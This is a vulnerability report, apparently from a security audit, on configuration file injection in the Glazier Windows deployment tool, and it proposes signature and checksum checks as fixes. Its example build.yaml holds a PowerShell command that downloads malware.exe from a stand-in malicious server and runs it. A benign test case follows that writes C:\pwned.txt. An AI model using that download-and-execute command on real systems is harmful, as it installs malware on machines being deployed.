### Vulnerability List

- Vulnerability Name: **Configuration File Injection**
- Description:
    1. Glazier retrieves configuration files (YAML) from a web server using HTTPS.
    2. Glazier parses these configuration files to determine the actions to be performed during Windows deployment.
    3. If an attacker gains control of the web server hosting the configuration files, they can modify these YAML files.
    4. By modifying the configuration files, the attacker can inject arbitrary actions into the Glazier deployment process.
    5. These malicious actions will be executed on the target Windows systems during deployment, as Glazier blindly trusts the content of the configuration files from the server.
- Impact:
    - **Critical**. Successful exploitation allows a remote attacker to execute arbitrary code on target Windows systems during the deployment process. This can lead to:
        - Complete system compromise.
        - Installation of malware, backdoors, or ransomware.
        - Data theft or modification.
        - Denial of service by rendering systems unusable.
        - Privilege escalation.
- Vulnerability Rank: **Critical**
- Currently Implemented Mitigations:
    - **HTTPS for communication**: Glazier uses HTTPS to retrieve configuration files and payloads. This encrypts the communication channel, protecting against man-in-the-middle attacks during transit, but it does not verify the integrity or authenticity of the content originating from the server itself.
        - Location: Described in `/code/README.md` ("Glazier distributes all data over HTTPS").
- Missing Mitigations:
    - **Integrity and Authenticity Checks for Configuration Files**: Glazier lacks any mechanism to verify the integrity and authenticity of the configuration files. This could be implemented using:
        - **Digital Signatures**: Signing the configuration files using a private key and verifying the signature using a corresponding public key within Glazier.
        - **Checksum Verification**:  Calculating a cryptographic hash (e.g., SHA256) of the configuration files and verifying this hash against a known trusted value stored securely within Glazier or fetched from a separate trusted source.
- Preconditions:
    1. **Attacker Access to Web Server**: The attacker must compromise the web server that hosts the Glazier configuration files. This could be achieved through various means, such as exploiting vulnerabilities in the web server software, gaining access to server credentials, or social engineering.
    2. **Glazier Instance configured to use compromised server**: Target Glazier instances must be configured to fetch configuration files from the compromised web server.
- Source Code Analysis:
    1. **Configuration File Fetching**: Glazier uses the `requests` library to fetch configuration files over HTTPS.
        - File: `/code/glazier/lib/config/builder.py` (and potentially other modules involved in network requests).
        - Code inspection is needed to confirm the exact method of fetching and parsing YAML files.
    2. **YAML Parsing**: Glazier uses `PyYAML` to parse the fetched YAML configuration files.
        - File: `/code/glazier/lib/config/builder.py` (and potentially other modules handling YAML parsing).
        - Code inspection is needed to verify how YAML files are loaded and processed into actions.
    3. **Action Execution**: The `ConfigRunner` executes actions defined in the parsed configuration files.
        - File: `/code/glazier/lib/config/runner.py`
        - Code inspection is needed to understand how actions are dynamically loaded and executed based on the YAML configuration.

    **Vulnerability Trigger**:
    - The vulnerability is triggered when Glazier fetches and processes a malicious configuration file from a compromised web server.
    - The lack of integrity checks allows Glazier to proceed with parsing and executing the attacker's injected malicious actions without any warning or error.
    - For example, an attacker could modify a `build.yaml` file on the web server to include a malicious `Execute` action that downloads and runs malware on the target system.

    ```python
    # Example of malicious YAML injection in build.yaml on the compromised server:
    controls:
      - Execute:
        - ['powershell.exe -Command "Invoke-WebRequest -Uri http://malicious.server/malware.exe -OutFile C:\\Windows\\Temp\\malware.exe; C:\\Windows\\Temp\\malware.exe"']
    ```
    - When Glazier processes this modified `build.yaml`, it will download `malware.exe` from the attacker's server and execute it on the target Windows system.

- Security Test Case:
    1. **Setup a Glazier Test Environment**:
        - Deploy a Glazier instance in a test environment.
        - Configure Glazier to fetch configuration files from a web server you control (for testing purposes, this can be a local web server).
    2. **Prepare a Malicious Configuration File**:
        - Create a modified `build.yaml` file that includes a malicious action. For example, use the `Execute` action to create a file on the target system as evidence of code execution.
        ```yaml
        controls:
          - Execute:
            - ['powershell.exe -Command "New-Item -ItemType File -Path C:\\pwned.txt -Value \'You have been PWNED!\'"]
        ```
    3. **Replace the legitimate `build.yaml` on the test web server with the malicious `build.yaml`**.
    4. **Initiate a Glazier deployment on a test Windows system**, pointing it to the test web server with the malicious configuration.
    5. **Observe the Target System**:
        - After Glazier deployment completes (or during if possible to monitor), check the test Windows system.
        - Verify that the file `C:\pwned.txt` has been created with the content "You have been PWNED!".
    6. **Expected Result**: The file `C:\pwned.txt` should be present on the target system, demonstrating successful execution of the injected malicious action from the modified configuration file. This confirms the Configuration File Injection vulnerability.